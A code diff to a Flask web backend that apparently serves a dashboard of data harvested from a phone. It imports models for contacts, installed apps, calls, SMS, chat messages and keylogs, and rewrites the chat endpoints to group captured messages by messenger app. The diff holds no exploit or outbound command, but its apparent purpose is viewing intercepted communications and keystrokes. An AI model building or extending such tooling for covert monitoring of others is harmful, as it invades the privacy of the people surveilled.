@@ -2,7 +2,7 @@ from flask import Flask, render_template, jsonify, request
 import os
 from flask_sqlalchemy import SQLAlchemy
 from db import db
-from models import ChatMessage, SMSMessage, CallLog, ArchivedItem
+from models import Contact, InstalledApp, Call, SMS, ChatMessage, Keylog
 import logging
 
 # Configure logging
@@ -37,26 +37,33 @@ def index():
 @app.route('/api/chats')
 def get_chats():
     try:
+        # Get unique messengers (chat apps) and their latest messages
         chats = db.session.execute(
-            db.select(ChatMessage)
-            .group_by(ChatMessage.conversation_id)
-            .order_by(ChatMessage.timestamp.desc())
-        ).scalars().all()
+            db.text("""
+                SELECT 
+                    messenger,
+                    MAX(time) as last_time,
+                    COUNT(*) as message_count
+                FROM ChatMessages 
+                GROUP BY messenger
+                ORDER BY last_time DESC
+            """)
+        ).fetchall()
         
         chat_data = []
         for chat in chats:
-            # Get the latest message for each conversation
+            # Get the latest message for each messenger
             latest_message = ChatMessage.query.filter_by(
-                conversation_id=chat.conversation_id,
-                is_archived=False
-            ).order_by(ChatMessage.timestamp.desc()).first()
+                messenger=chat.messenger
+            ).order_by(ChatMessage.time.desc()).first()
             
             if latest_message:
                 chat_data.append({
-                    'conversation_id': chat.conversation_id,
-                    'last_message': latest_message.content,
-                    'timestamp': latest_message.timestamp,
-                    'unread': True  # You might want to add a proper unread tracking system
+                    'messenger': latest_message.messenger,
+                    'last_message': latest_message.text,
+                    'timestamp': latest_message.time,
+                    'sender': latest_message.sender,
+                    'message_count': chat.message_count
                 })
         
         return jsonify(chat_data)
@@ -64,19 +71,18 @@ def get_chats():
         logger.error(f"Error fetching chats: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/messages/<int:conversation_id>')
-def get_messages(conversation_id):
+@app.route('/api/messages/<string:messenger>')
+def get_messages(messenger):
     try:
         messages = ChatMessage.query.filter_by(
-            conversation_id=conversation_id,
-            is_archived=False
-        ).order_by(ChatMessage.timestamp.desc()).all()
+            messenger=messenger
+        ).order_by(ChatMessage.time.desc()).all()
         
         return jsonify([{
-            'id': msg.id,
-            'text': msg.content,
-            'time': msg.timestamp.strftime('%Y-%m-%d %H:%M:%S'),
-            'sender': 'user' if msg.sender_id == 1 else 'contact'  # Assuming user_id 1 is the current user
+            'id': msg.message_id,
+            'text': msg.text,
+            'time': msg.time.strftime('%Y-%m-%d %H:%M:%S'),
+            'sender': msg.sender
         } for msg in messages])
     except Exception as e:
         logger.error(f"Error fetching messages: {e}")
